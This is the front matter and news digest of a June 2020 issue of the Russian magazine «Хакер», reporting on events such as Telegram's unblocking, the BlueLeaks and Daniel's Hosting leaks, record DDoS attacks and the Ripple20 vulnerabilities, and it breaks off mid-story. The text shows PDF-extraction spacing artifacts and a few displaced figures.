
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                               Июнь 2020
            № 255
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Архитектура Fuchsia и тяжеловес ные вычисления в UI-потоке

    Практика разбитых окон
  Как устроена система безопас ности Windows и как ее обходят

    Как устроена память Hyper-V
  EXO-разделы и виртуаль ные машины сторонних про изводителей

    Путеводитель по Metasploit
  Разбира ем примеры исполь зования зна менитого фреймворка

    Утиные истории
  Делаем свой аналог Rubber Ducky с бес провод ной связью

    Такие дела
  Как и за что судили россий ских хакеров в 2019 году

    Фундаментальные основы хакерства
  Ка кие быва ют вир туальные фун кции и как их искать

    Пингвин-супершпион
  Исполь зуем вир туалку с Linux для постэкс плуата ции Windows

    Виртуальный полигон
  Делаем лабора торию сетево го хакера

    Голые диски
  Смот рим, что внутри у внеш них накопи телей WD и Seagate

    Ноутбук своими руками
  Выбира ем ком плек тующие и собира ем производительный лэптоп

    Тотальный микроконтроль
  Ка кие быва ют микрокон троллеры и как выбрать подходящий

    Погружение в ассемблер
  Делаем пер вые шаги в осво ении асма

     Nftables
  Как выглядит будущее настройки фай рво ла в Linux

    Стена огня lvl2
  Настра иваем файрвол для отра жения атак на примере MikroTik

    RISC без риска
  Ставим RISC OS на Raspberry Pi, чтобы прикоснуться к исто рии

   GNU GuixSD
  Зна комим ся с операционкой нового поколения

    Титры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





TELEGRAM
РАЗБЛОКИРОВАЛИ
18 июня 2020 года Роскомнадзор неожиданно сообщил, что ведомство
положительно оценива ет ранее выказанную Павлом Дуровым готовность
противодействовать терроризму и экстремизму в Telegram. В итоге ограниче‐
ния доступа к мессенджеру, действовавшие с весны 2018 года, были сняты
по согласованию с Генеральной прокуратурой РФ, а реестр запрещенных
сайтов за один день «похудел» до 30 тысяч IP‐адресов (с 676 тысяч адре сов).
  Замглавы Минкомсвя зи РФ Алексей Волин заявил, что данное решение
было принято Роскомнадзором и прокура турой, пос кольку в настоящее вре‐
мя нет технической возможнос ти бло кировать Telegram, а также в связи с тем,
что представители мес сенджера «начали активно сотрудни чать по борьбе
с терроризмом и наркоманией в своей среде».
  Напомню, что недавно на рас смотрение в Госдуму был внесен законоп‐
роект о разблокировке Telegram. Его в конце апреля 2020 года подготовили
депутаты Госдумы от «Справедливой России» Федот Тумусов и Дмитрий
Ионин. По их мнению, безус пешные попытки блокировать мессенджер лишь
«наносили урон престижу государственной власти».
  В целом эта идея возникла из‐за того, что в настоящее вре мя Telegram,
по сути, оказался «офи циальным сервисом» госорганов, через который они
распространяют информацию о корона виру се (речь идет об официальном
канале оперштаба Москвы и официальном канале Стопкоронавирус.рф).
  В ответ на эту инициативу Павел Дуров писал, что «при полном сох‐
ранении тайны переписки в рамках политики конфиденциальнос ти Telegram
были разработаны механизмы, которые позволя ют предотвращать террорис‐
тические акты по всему миру». Также он подчерки вал, что борьба с террориз‐
мом и право на тайну личной переписки вовсе не исключают друг друга.
И именно на этот пост в ито ге сос лались представители Рос комнадзора
при разблокировке.
  Павел Дуров сначала прокомментировал раз блокировку мессенджера
в своем русскоязычном Telegram‐канале, где поб лагодарил всех пользовате‐
лей за поддержку и пообещал, что пра во на конфиденциальность и тайну лич‐
ной переписки останется фундаментальным принципом Telegram во всех
странах. Также Дуров заверил, что теперь должны вырасти стабильность
и скорость работы Telegram, а также выразил надежду, что разблокировка
станет хорошим сигналом для IT‐предпри нимателей и инвесторов.
  Затем комментарий появился и в англо язычном Telegram‐канале Дурова,
он тоже посвящен снятию блокировки с мес сенджера, но существенно отли‐
чается от русскоязычного. В нем Павел Дуров пишет:



      «В апре ле 2018 года рос сийский регулятор Рос комнадзор заблокиро-
      вал Telegram на тер ритории стра ны. Мы зна ли, что это произойдет,
      и к началу блокировок уже обновили приложе ния Telegram, добавив
      под дер жку ротационных прок си‑сер веров, способов сок рытия тра-
      фика и дру гих инс тру ментов борьбы с цензурой. К нам присоеди-
      нились тысячи рос сийских инже неров, которые соз дали собс твенные
      прок си для пользовате лей Telegram, сфор мировав децентра лизован-
      ное движение под наз ванием „Циф ровое соп ротив ление“.
        Пер вая неделя бана была неп ростой, и у многих наших пользовате-
      лей в Рос сии воз никали проблемы с соединением. Пыта ясь не допус-
       тить пользовате лей в Telegram, Рос комнад зор заблокировал мил-
      лионы IP-адре сов. Одна ко бла года ря „Циф ровому соп ротив лению“
      пос ле мая 2018 года Telegram стал широкодос тупен в Рос сии.
       В результате чис ло пользовате лей Telegram в Рос сии не умень-
      шилось, фак тичес ки оно удвоилось с 2018 года. В мае 2020 года
      из 400 миллионов еже месяч но  активных  пользовате лей  Telegram
      не менее 30 миллионов были из Рос сии. Это зна чит, что наш рост
      в Рос сии соответс тву ет рос ту в дру гих стра нах. Проще говоря, бан
      не сра ботал.
        На прош лой неделе Рос комнад зор, у которого два месяца назад
      появился новый гла ва, решил соответс твовать действительнос ти, объ-
       явив, что Telegram в Рос сии более не блокиру ется. В своем заяв лении
      они сос лались на мое сообщение от 4 июня, где я объяснил, почему
      зап рет не име ет особого смыс ла.
        Эти переме ны сле дует поп риветс твовать, и я наде юсь, они продол-
      жатся. Если же нет, то мы наде емся, что мало кто из пользовате лей
      заметит раз ницу.
       В  течение  пос ледних  двух  лет  нам  приходилось  регуляр но
      обновлять нашу „раз блокиру ющую“ технологию, чтобы опе режать цен-
      зоров. Я гор жусь тем, чего мы дос тигли, — она [технология] уникальна
      сре ди приложе ний социальных медиа.
      Мы не хотим, чтобы эта технология зар жавела и уста рела. Поэтому
     мы решили нап равить наши противоцензурные ресур сы в дру гие мес-
        та, где Telegram до сих пор зап рещен пра вительства ми, в такие стра-
      ны, как Иран и Китай. Мы просим админис тра торов быв ших прок-
      си‑сер веров для рос сийских пользовате лей сконцентрировать свои
      усилия на этих стра нах. Так же им сле дует быть готовы ми к новым
      вызовам: по мере того как политичес кая ситу ация в мире ста новится
      все  более  неп ред ска зуемой,  все  больше  пра вительств  могут
      попытаться блокировать ориентированные  на  конфиденциальность
      приложе ния, такие как Telegram.
        Движение „Циф ровое соп ротив ление“ не закончилось на прош лой
      неделе пос ле прек ращения огня в Рос сии. Оно только начина ется
      и ста новится глобальным».


50 000 ДОЛЛАРОВ ЗА БАГИ В PLAYSTATION

Sony запустила официальную программу bug bounty для PlayStation Network и игровых кон‐
солей  PlayStation  4. Ком пания сообщает, что готова выплачивать ИБ‐экспертам от 100
до 50 000 долларов (и даже боль ше) за уязвимос ти в своих продуктах. Проблемы предлага‐
ется искать в самих игровых консолях PlayStation 4, их операционной системе, офи‐
циальных аксессуарах, а также в PlayStation Network и на соот ветс твующих сайтах.

Хотя Sony решилась учредить bug bounty последней из круп ных игровых компаний, она пред‐
лагает самые большие вознаграждения за баги. Так, Microsoft и Nintendo обещают за уяз‐
вимости не более 20 000 долларов.





«ПОЛИЦЕЙСКАЯ»
УТЕЧКА
В конце июня группа активистов DDoSecrets (Distributed Denial of Secrets),
описывающая себя как «борцов за проз рачность», опубликовала в откры том
доступе 269 Гбайт данных, принадлежащих пра воохранительным органам
и центрам обработки информа ции в США.
  Центры обработки информа ции (Fusion Center) обычно выступают в роли
посредников и коор динационных центров меж ду правоохранительными орга‐
нами на уровне штатов, мес тными орга нами влас ти и федеральными орга‐
нами США. Такие центры участву ют в подготовке офицеров, передают мес‐
тным полицейским федеральные предупреждения, руководс тва и раз личные
инструкции от центрального правительства и наоборот.


             INFO

                       DDoSecrets нередко называют  аналогом  Wik‐
                           iLeaks, так как предыдущие «сливы» активистов
                      разоблачали крупные правительственные и кор‐
                      рупционные скандалы по всему миру, а сама
                       DDoSecrets регуляр но упоминается на страницах
                         таких крупных изда ний, как New York Times, CNN,
                       The Daily Beast.


Обнародованный дамп получил общее наз вание BlueLeaks, и он содержит
более миллиона файлов, включая сканы документов, виде оролики, электрон‐
ные письма, аудиофайлы. Представители DDoSecrets утверждают, что данные
были «любезно предоставлены» им хактивис тами из Anonymous.
  Файлы из дампа принадлежат 200 раз личным полицейским управле ниям
и центрам обработки информации в США: отчеты полиции и ФБР, бюллетени
безопасности,  руководства для правоохранитель ных  органов примерно
за десять лет.
   Большинство опубликованных файлов имеют пометку Netsential.com Inc —
это название хостинговой компании, базиру ющейся в Техасе, которая,
похоже, была взломана. В своем блоге известный ИБ‐журналист Брайан
Кребс сооб щил, что Национальная ассоциация центров обработки информа‐
ции США (National Fusion Center Association, NFCA) уже под твердила под‐
линность этой утечки, разослав своим членам внутреннее оповеще ние.
  По информации NFCA, предварительный ана лиз показал, что опуб‐
ликованные в открытом дос тупе данные дей стви тель но взя ты с серверов ком‐
пании Netsential, которая предос тавляет услуги хос тинга правоохранитель‐
ным органам и цен трам обработки информа ции.





Этот слив считают самым большим взло мом в истории правоохранительных
органов США, так как он раскрывает секретные матери алы за десять лет,
в том числе о том, как полиция США обучала персонал и проводила опе‐
рации.
   Хотя файлы BlueLeaks дос тупны на собственном сайте DDoSecrets, пуб‐
ликацию дампа также анонсирова ли и активно рекламировали через Twitter.
В итоге Twitter заблокировал учетную запись DDoSecrets из‐за нарушения
правил: за распространение данных, полученных незаконным путем (то есть
при помощи взлома) и содержащих личную информацию, которая может
использоваться для причинения физичес кого вреда или содержит ком‐
мерческую тайну.
  В интервью изданию Wired руководитель DDoSecrets журналистка Эмма
Бест рассказала, что активис ты всеми силами старались избе жать пуб‐
ликации любой конфиденциальной информа ции. Так, команда потратила
неделю на очистку файлов от «особо деликат ных данных о жертвах прес‐
туплений и детях, а также от информации о час тных предприятиях, учрежде‐
ниях здравоохранения и ассоциациях ветеранов». Однако Бест признала, что
они могли что‐то пропустить.
  Представите ли Twitter сообщили СМИ, что среди данных BlueLeaks дей‐
ствительно была неот редактированная информа ция, которая могла под‐
вергать риску конкретных людей. Также в компании подчеркну ли, что правила
платформы строго запрещают рас простра нение любых подобных матери‐
алов.
  Социальная сеть подверглась критике из‐за данного решения. Многие
пользователи  указывали  на  очевидное  несо ответствие:  раньше  Twitter
месяцами и даже годами ничего не предпринима ла для блокировки учетных
записей известных хакерских групп, таких как Guccifer 2.0 или TheDarkOver‐
lord. К тому же другие аккаунты, такие как WikiLeaks и многочис ленные ано‐
нимы, давно распространяют данные, полученные в результате взломов,
однако эти учетные записи активны по сей день.
  Дамп BlueLeaks по‐прежнему дос тупен на сайте DDoSecrets, однако поль‐
зователи больше не могут делить ся ссылками на него в Twitter: социальная
сеть запретила не только учетную запись DDoSecrets, но и URL‐адрес сайта
активистов.


DDOS‐РЕКОРДЫ
В июне 2020 года стало извес тно сразу о нес кольких масштабных DDoS‐атаках, которые обно‐
вили предыдущие рекорды в этой области.


В феврале текущего года сервис AWS Shield отразил самую крупную DDoS‐атаку в истории,
достигавшую мощности    Тбайт/с. Неизвестно, против какого клиента AWS была предпри‐нята столь мощная атака.2,3





DDoS был организован с использованием взломанных веб‐серверов CLDAP. Урегулирование
инцидента заняло у сотрудников AWS Shield 3 дня.

Прошлый рекорд в этой области был установлен в 2018 году, тог да зафиксировали DDoS‐атаку
мощностью 1,7 Тбайт/с.


Следом за Amazon о мощной DDoS‐атаке рассказали и спе циалис ты Akamai: 21 июня 2020 года
крупный европейский банк (название не раскрывается) стал мишенью для одной из мощней‐
ших DDoS‐атак в истории. Хотя мощность атаки сос тавила лишь 418 Гбит/с, эксперты фик‐
сировали до 809 000 000 пакетов в секунду.

Инцидент длился недолго (около 10 минут), но атака «разог налась» до опас ной мощности
очень быстро. Потребовалось лишь несколько секунд, чтобы нор мальный уровень трафика под‐
нялся до 418 Гбит/с, и около 2 минут, чтобы атака дос тигла пика в 809 000 000 пакетов
в секунду.





ДАННЫЕ
DANIEL’S HOSTING
Хакер, скрывающийся под псевдонимом KingNull, слил в открытый доступ
базу одного из крупнейших хостингов в даркнете — Daniel’s Hosting (DH).
  Напомню, что весной текущего года DH подвергся взлому. Тогда неиз вес‐
тные злоумышленники получили доступ к бэкенду DH и удалили все связанные
с хостингом базы данных, а также учет ную запись владельца. Разработчик
хостинга Дэниел Винзен (Daniel Winzen) рас сказал в блоге, что обнаружил
взлом слишком поздно, когда спа сать что‐либо уже было бес полезно. Дело
в том, что DH намеренно не имел никаких резервных копий.
  В итоге Винзен закрыл свой хостинг и призвал пользовате лей переносить
свои сайты в другие места. Пос ле закрытия DH в общей сложности око‐
ло 7600 сайтов (примерно треть всех onion‐ресурсов) ушли в офлайн.
  При этом разработчик уверял, что в целом хотел бы перезапустить сервис
с новыми функциями и улучшениями, чтобы больше не приходилось тратить
все свободное время на администрирова ние. Однако предупреждал, что
это вряд ли произой дет в ближайшие месяцы.
   Как выясняется теперь, в марте 2020 года базы DH были не только уда‐
лены, но и похищены. Некто под ником KingNull загрузил копию украденной
БД в файлообменник и уведомил об этом журналис тов издания ZDNet.
  Судя по беглому ана лизу дампа, утечка включает 3671 адрес электронной
почты, 7205  паролей  от  учетных  записей  и 8580  приватных ключей
для доменов .onion.





Специалисты компании Under the Breach, которые помогали журналистам
исследовать дан ные, подтвержда ют, что опуб ликованный дамп содержит
информацию о владельцах и пользователях нескольких тысяч доменов в дар‐
кнете. По словам исследователей, благодаря этой базе можно свя зать email‐
адреса из базы с конкрет ными даркнет‐сайтами.



      «Эта информа ция может очень помочь пра воохранительным органам
      отсле дить  лиц, которые управляют этими сайтами или учас тву ют
      в незаконной деятельнос ти на этих ресур сах», — заяв ляют в Under
       the Breach.

Более того, если владельцы сайтов перенесли свои ресурсы на дру гой хос‐
тинг, но продолжили использовать старые пароли, хакеры могут захватить
новые учетные записи (если взло мают утекшие у DH хешированные пароли).


НОВОЕ ОБВИНЕНИЕ ПРОТИВ ОСНОВАТЕЛЯ WIKILEAKS
Министерство юстиции США опубликовало новый обвинительный акт, направлен ный против
основателя WikiLeaks Джулиана Ассанжа. Документ не добавляет новых обвинений к 18 пун‐
ктам, уже выдвинутым США в мае 2019 года, однако проливает свет на новые детали пред‐
полагаемых преступлений Ассанжа и расширяет изначальные обвинения таким образом, чтобы
их можно было переклассифицировать на более серьезные.





→«В 2012 году Ассанж вступил в прямой контакт с лидером хакерской группы LulzSec
(который к тому времени сотрудничал с ФБР) и предос тавил ему спи сок целей для взлома.
Для одной из целей Ассанж попросил лидера LulzSec прос мотреть [чужую] почту и документы,
базы данных и PDF‐файлы (и предоставить их WikiLeaks).
   В другом разговоре Ассанж сказал лидеру LulzSec, что наибольший резонанс принесет
выпуск материалов, похищен ных посредством взлома у ЦРУ, АНБ или New York Times.
[В итоге] WikiLeaks получила и опубликовала электронные пись ма американ ской аналитичес кой
консалтинговой компании, полученные в результате взлома и утечки дан ных, совершенных
Anonymous и аффи лированным с группой LulzSec хакером. По словам этого хакера, позже
Ассанж косвенно просил его снова заспамить эту пос традавшую компанию».
— из текста обвинительного акта





РЕФЕРАЛЫ В BRAVE
Пользователи заметили странность в поведении ориентированного на кон‐
фиденциальность браузера Brave: автозаполнение подставляло в строку
адреса реферальные ссылки.
  Первым на странное поведение бра узера обратил внимание поль‐
зователь Twitter Янник Экл (Yannick Eckl). Ока залось, что, если пользователь
набирает в Brave адрес криптовалютной биржи Binance (binance.us или bi‐
nance.com), срабатывает автозаполнение, которое включено по умол чанию,
и  в  адресной  строке  появляется  партнерская  ссылка  binance.us/en?
ref=35089877.





Как выяснилось, эта ссылка связана с недавно заключенным партнерским
соглашением между Brave и Binance. Так, в марте текущего года компании
представили специальный виджет для браузера, соз данный для тех, кто
работает с биржей и торгует криптовалютой. Этот виджет приносит разработ‐
чикам браузера прибыль благода ря привлечению новых пользователей
и партнерской программе биржи.
   Глава Brave Брендан Эйх извинился за произошедшее в своем твиттере.
Он объяснил, что реферальная ссылка появилась в адресной строке случай‐
но. Brave должен исполь зовать реферальные ссылки для пользовате лей лишь
при работе с упомянутым виджетом, на специаль ной вкладке, а обычное
автозаполнение, конечно, не должно было содержать подобных кодов.
  Однако другие пользователи Twitter не согласились с тем, что разработ‐
чики Brave просто допус тили ошибку. Дальнейшее исследование репози‐
тория Brave на GitHub показало, что браузер также содержит реферальные
ссылки для URL‐адресов Ledger, Trezor и Coinbase. И от таких партнерств бра‐
узер тоже получает прибыль.
  В настоящее время разработчики Brave уже отключили автозапол нение
по умолчанию, однако Эйх отмечает, что в целом нет ничего плохого
в использовании реферальных программ и попытках построить жизнеспособ‐
ный бизнес. По его словам, партнерская ссылка не должна была попадать
в автозаполнение адресной строки, но вот поисковые запросы — это уже
совсем другой разговор.


129 УЯЗВИМОСТЕЙ

«Вторник обновлений» в этом месяце стал самым крупным за всю историю компании Microsoft:
было исправлено сразу 129 проблем. На втором месте находит ся март 2020 года со 115
исправлениями, а на третьем — 113 исправлений в апреле 2020 года. Таким образом, общее
количество исправлений, выпущенных ком панией в этом году, уже составляет 616, и это почти
столько же, сколько за весь 2017 год.

Из всех 129 уязвимостей лишь 11 получили статус критичес ких (они затрагивают саму Windows,
браузеры Edge и Internet Explorer, а также SharePoint). Еще 109 проблем оце ниваются как важ‐
ные (они затронули Windows, браузе ры компании, Ofﬁce, Windows Defender, Dynamics, Visual
Studio, Azure DevOps и Android‐приложе ния).





УЯЗВИМОСТИ
RIPPLE20
Специалисты израильской компании JSOF обнаружили 19  уяз вимостей
в небольшой библиотеке, которая была соз дана еще в девяностых годах
и все это время активно использовалась во множестве различных продуктов.
  В итоге под угрозой оказались сотни миллионов устройств, включая прин‐
теры, маршрутизаторы, различные решения для умного дома, электросете‐
вое, медицинское и промышленное оборудование, транспортные системы,
оборудование для мобильной и спутниковой связи, дата‐центры и многое,
многое другое.


                                     Продолжение статьи →
← Начало статьи





   Хуже того, уязвимости в большинстве продуктов вряд ли будут когда‐либо
  исправлены из‐за сложных или непрозрачных цепочек поставок ПО. Дело
   в том, что проблемная биб лиотека не только использовалась поставщиками
  оборудования, но и интегрировалась в дру гие прог раммные пакеты. А значит,
  многие компании даже не подоз рева ют, что исполь зуют этот конкретный код,
  ведь библиоте ка часто вооб ще не упомина ется в манифес тах.
     Найденные экспертами проблемы получили общее название Ripple20
  и были найдены в небольшой библиотеке, раз работанной компанией Treck.
  Выпущенная еще в 1997 году, эта биб лиотека представляет собой облегчен‐
  ную имплементацию стека TCP/IP. Компании десятилетиями использовали
   это решение, чтобы их устройства или софт могли подключаться к интернету
  через TCP/IP.
     Эксперты JSOF решили изу чить стек Treck из‐за его массового присутс‐
   твия на рынке промышленных, медицин ских и умных устрой ств. В итоге,
   как сказано выше, были обна ружены 19 различных уязвимостей, над исправ‐
  лением которых JSOF уже много месяцев работа ет вместе со спе циалистами
  CERT.
     Представите ли Treck, сна чала решившие, что столкнулись с мошенниками
  и вымогательством, осознали свою ошиб ку и тоже подключились к делу. Сей‐
  час исправления доступны для всех уяз вимос тей Ripple20. Но, увы, аналитики
  JSOF пишут, что работа еще далека от завершения и многие уяз вимые
  устройства еще предстоит выявить.
     К счастью, не все уязвимости Ripple20 кри тичес кие, хотя некоторые из них
  все же весьма опасны и поз воляют злоумышленникам удаленно захватывать
  контроль над уязвимыми системами. Так, Минис терство внутренней безопас‐
  ности США  присвоило  рейтинг  10  и  9,8  по  десятибалльной шкале
  CVSSv3 четырем из уязвимос тей Ripple20:
   • CVE‐2020‐11896 (CVSSv3 — 10): допускает уда ленное выполнение про‐
     извольного кода;
   • CVE‐2020‐11897 (CVSSv3 — 10): допускает запись out‐of‐bounds;
   • CVE‐2020‐11898 (CVSSv3 — 9,8): может привести к рас крытию конфиден‐
     циальной информации;
   • CVE‐2020‐11899 (CVSSv3 — 9,8): может привести к рас крытию конфиден‐
     циальной информации.

  Четыре эти проб лемы могут позволить злоумышленникам легко захватить
  контроль над умными устройства ми или про мышленным и медицинским обо‐
  рудованием. Атаки возможны как через интернет, так и из локальных сетей.
    Иссле дователи полагают, что грядущее влияние проб лем Ripple20 можно
  сравнить  с  другим «набором»  уязвимос тей —  Urgent/11, информация
  о которых была обнародована летом 2019 года. Те проб лемы до сих пор изу‐
  чаются, и эксперты постоянно обна ружи вают все новые уязвимые устройства.
     Это сравнение неслучайно, так как уяз вимости Urgent/11 касаются работы
   стека TCP/IP (IPnet), который используется в операционной сис теме реаль‐
  ного времени (RTOS) VxWorks, а также OSE от ENEA, Integrity от Green Hills, Mi‐
   crosoft ThreadX, ITRON от TRON Forum, Mentor Nucleus RTOS и ZebOS.


 ГЕЙМЕРЫ ПОД УДАРОМ
   Исследователи «Лаборатории Кас перского» прис тально изучили происхо дящие вокруг переме‐
   ны, связанные с цифровой безопасностью и пандемией коронавируса. В частнос ти, пандемия
   привела к резкому росту активности игроков, и это не усколь зну ло от внимания хакеров.


   По данным gamesindustry.biz, в марте 2020 года значитель но выросли продажи игр, как компь‐
   ютерных, так и консольных.





   Также в апреле 2020 года дос тигло невидан ных величин количество активных игроков на плат‐
   форме Steam, оно впервые в истории превзошло 24,5 мил лиона человек.





   Количество ежедневных попыток переходов на зараженные сайты, экс плуатирующие игровую
   тематику, выросло на 54% по сравнению с январем текущего года.

   Возросло и количество заблокированных переходов на фишин говые сайты, эксплуатирующие
   игровую тематику. В частности, в апреле по сравнению с февралем на     выросло количес‐   тво заблокированных попыток перехода на сайты, имитирующие Steam.40%

   Чаще всего злоумышленники эксплуатировали в таких кам паниях название игры Minecraft,
   тем самым стремясь привлечь внимание пользователей. Оно фигурировало более чем
   в 130 000 атак. Также в топ‐3 экс плуатируемых названий вошли такие игры, как Counter-
   Strike: Global Offensive и The Witcher 3: Wild Hunt.





   Эксперты рассказывают, что приманками для пользователей обычно становились обещания
   бесплатных версий популярных игр, обновлений и расширений, а также различных
   читов.





 УДАЛИТЕ FLASH
  Еще в 2017 году компании Apple, Facebook, Google, Microsoft, Mozilla, а также
  сама компания Adobe анонсировали сроки прекращения поддержки Flash.
   Технологию «умертвят» 31 декабря 2020 года, после чего ее под держку прек‐
   ратят все эти организации.
     Точный срок прекращения поддержки был объявлен в этом месяце на спе‐
  циальной странице поддержки, которую Adobe подготовила за полгода
  до указанной даты.
     Adobe пояснила, что намеревается не прос то прекратить предоставлять
  обновления для Flash Player, но планирует удалить все ссылки для его заг‐
   рузки со своего сайта, что бы пользователи не могли скачать и установить
  неподдерживаемую версию ПО.
     Также компания заявила, что весь «Flash‐контент будет заблокирован
  для запуска в Adobe Flash Player пос ле даты истечения срока поддержки». То
   есть компания добавила или пла ниру ет добавить в код Flash Player своеоб‐
  разную  «часовую  бомбу»,  чтобы  предотвратить  его  использование
   в будущем.
     Кроме того, Adobe сооб щает, что до конца года собирается попросить
  пользователей вообще уда лить Flash Player со своих компьютеров.
     Эти действия можно было бы назвать весь ма агрессивными, ведь про‐
  изводители редко столь катего рично зап рещают людям использовать свои
  продукты после окончания срока поддержки. Одна ко Flash Player всегда был
  одной из главных целей для хакеров и авто ров мал вари. Как только его
  перестанут поддерживать, пользователи ста нут открыты для новых уяз вимос‐
   тей и атак, и компания надеется избежать этого.


  150 000 ДОЛЛАРОВ ФАЛЬШИВОМУ МАСКУ
  Мошенники захватили три YouTube-канала (Juice TV, Right Human и MaximSakulevich) и дали
   им новые названия, связанные с компанией SpaceX (SpaceX Live и SpaceX). Один из угнанных
   каналов имел 230 000 подписчиков, а другой — 131 000 подписчиков.

   Затем хакеры стали транслировать видео с Илоном Маском, интервью и конферен ции SpaceX.
   Выдавая эти записи за живые стримы, злоумышленники проводили фиктивные раздачи биткой‐
   нов. Они просили зрителей прислать им небольшое количес тво криптовалюты, чтобы поучас‐
   твовать в раздаче и получить обратно уже удвоенную сум му.

   Таким образом злоумышленники выманили у пользователей больше 150 000 долларов
   в криптовалюте всего за 2 дня.





                                     Фальшивый стрим





 MASTER? MAIN!
  Нэт Фридман (Nat Friedman), воз главивший GitHub после сделки с Microsoft
   в 2018 году, заявил в Twitter, что в компании уже ведется работа над заменой
  термина master на более нейтральный ана лог, например main, чтобы избе‐
  жать ненужных отсылок к рабовладельческим временам.
     Если это действитель но произойдет, GitHub станет одной из многих
  ИТ‐компаний и опенсорсных проектов, высказавшихся за отказ от терминов,
  которые могут быть истолко ваны как оскорбительные с точки зрения чер‐
  нокожих разработчиков.
    Обычно отказываются от тер минов master и slave («хозяин» и «раб»)
   в пользу таких альтернатив, как main, default, primary и, соответственно, sec‐
   ondary. Также устоявшиеся понятия whitelist и blacklist, то есть «черный спи‐
   сок» и «белый список», заменя ют нейтральными allow list и deny/exclude list
   («список разрешений» и «список запретов/исклю чений»).
    Под влиянием протес тов Black Lives Matter, прокатившихся по всей тер‐
  ритории США, ИТ‐сооб щество вновь вернулось к обсужде нию этих вопросов.
  Многие разработчики прилагают усилия, чтобы удалить подобную тер‐
  минологию из своего исходного кода, при ложений и онлайн‐сервисов.
     К примеру, о намерении подыскать альтернативы для whitelist/blacklist
   в последнее время сооб щили разработчики Android, язы ка программирова‐
  ния Go, библиотеки PHPUnit и утилиты Curl. В свою очередь, авторы проекта
  OpenZFS уже работают над заменой тер минов master/slave, использующихся
  для описания связей между средами хра нения. Габриэль Чапо  (Gabriel
   Csapo), инженер LinkedIn, и вовсе заявил, что пода ет запросы на обновле ние
  многих внутренних библиотек Microsoft, добива ясь удаления из них любых
  расистских понятий.
     Другие проекты, которые не используют подоб ные термины напрямую
   в своем исходном коде или пользовательских интерфейсах, обратили вни‐
  мание на свои репозитории с исходниками. Дело в том, что большинс тво этих
  проектов управляют исходными кодами с помощью Git или GitHub, а Git
  и GitHub, в частности, используют обозначение master для дефолтного
  репозитория.
    СМИ отме чают, что ряд опенсорсных проектов уже поддержали Black Lives
   Matter и сме нили названия своих репози ториев с master по умол чанию
  на различные альтернативы (такие как main, default, primary, root). В их числе
  OpenSSL, Ansible, PowerShell, JavaScript‐биб лиотека P5.js и многие другие.
     Эти действия породили в опенсорсном сообщес тве весьма бурную дис‐
   куссию, и дело дошло до того, что над подобными изменени ями теперь
  задумались и разработчики Git (хотя соответс твующие обсужде ния в рас‐
  сылке и на GitHub Issues по‐прежнему далеки от завершения).
    Но что бы ни решили раз работчики Git, похоже, представите ли GitHub
  собираются идти своим путем. Так, недавно инженер Chrome Уна Кравец
  сообщила в  Twitter, что команда раз работки Chrome рассматривает воз‐
  можность переименовать дефолтную ветку исходников браузера с master
  на более нейтральное main.
    В своем сообщении Кравец попросила GitHub обратить вни мание на эту
  проблему и помочь изменить ситуацию в отрасли. И, как можно увидеть
  на иллюстрации ниже, на твит ответил сам глава GitHub Нэт Фрид ман. Он
   заявил, что это отличная идея и в GitHub уже работают над проблемой.





  Стоит  сказать,  что  разработчики  ста рают ся  искоренить  некорректные
  и потенциально оскорбитель ные термины не толь ко в последнее время. Все
  началось еще в 2014 году, ког да проект Drupal отказал ся от терминов
   master/slave в пользу primary/replica. Уже тогда при меру Drupal пос ледовали
  и другие, включая Python, Chromium, Microsoft Roslyn .NET, а также PostgreSQL
  и Redis.
     Несмотря на то что подобные перемены явно одобряют разработчики
  многих крупных проектов, пока все это не получило широкого распростра‐
   нения. К примеру, большинс тво противников подоб ных изменений часто объ‐
  ясняют в дискуссиях, что такие термины, как master/slave, в наши дни исполь‐
  зуются просто для описания техничес ких сценариев, а не как отсылка к фак‐
   тическому рабству. Слово же  blacklist, то есть «черный список», вообще
  не имеет никакого отношения к темнокожим людям. Оно появилось еще в
  средневековой  Англии,  когда,  например, имена  проблемных наемных
  рабочих заносили в специальные книги, которые назывались «черными» (при‐
  чем речь шла о позоре, порица нии и наказа нии, а совсем не о цвете кожи).


  ЧТО БУДЕТ С ПЕРСОНАЛЬНЫМИ ДАННЫМИ
   Журналисты «Известий» взяли интервью у главы группы компаний InfoWatch Натальи Каспер‐
   ской. Беседа в основном была пос вящена пос ледствиям пан демии коронавируса, а имен но
   проблемам «Социального мониторин га» и дальнейшей судьбе персональных данных граждан
   после окончания пандемии. По мнению специалис тки, за унич тожени ем собранной информа‐
   ции необходим тщательный контроль.





  →«Меня смущает, что из‐за необходимос ти выписывать пропуска граждане делятся своими
   довольно интимными данными. В этом смыс ле намере ния министра и мэра уничтожить их
   потом очень хорошие. Но как доказать, что данные действительно унич тожены? Наверное, дол‐
   жно быть независимое ведомство, которому это поручат, например Федеральная служба
   по техническому и экспортному контролю (ФСТЭК), или Федеральная служба безопасности,
   или группа общественников, которая проведет аудит, оценит, где эти данные хранились, каким
   образом были удалены, насколько удаление пол ное, не осталось ли там „хвостов“. Оче видно,
   нужно привлекать и внешних экспертов. Проведение аудита если и не даст стопроцентную
   гарантию, то по крайней мере значитель но снизит риск»
  — Наталья Касперская





 FACEBOOK
 ПРОТИВ ПЕДОФИЛА
  Удивительная исто рия стала достоянием общественности в июне 2020 года.
  Издание Vice Motherboard сообщило всему миру, что компания Facebook
  наняла сторонних ИБ‐экспертов и потратила шес тизначную сумму на соз‐
  дание эксплоита для 0day‐уяз вимости в операционной системе Tails. Все
   это было сделано ради деанонимизации и поимки одного человека, которого
   сотрудники социальной сети считали одним из худших киберпреступников
  во все времена.
    Журналисты  рассказали,  что  на  протяжении  дол гих  лет,  вплоть
  до 2017 года, житель Калифорнии преследовал и терроризи ровал девушек,
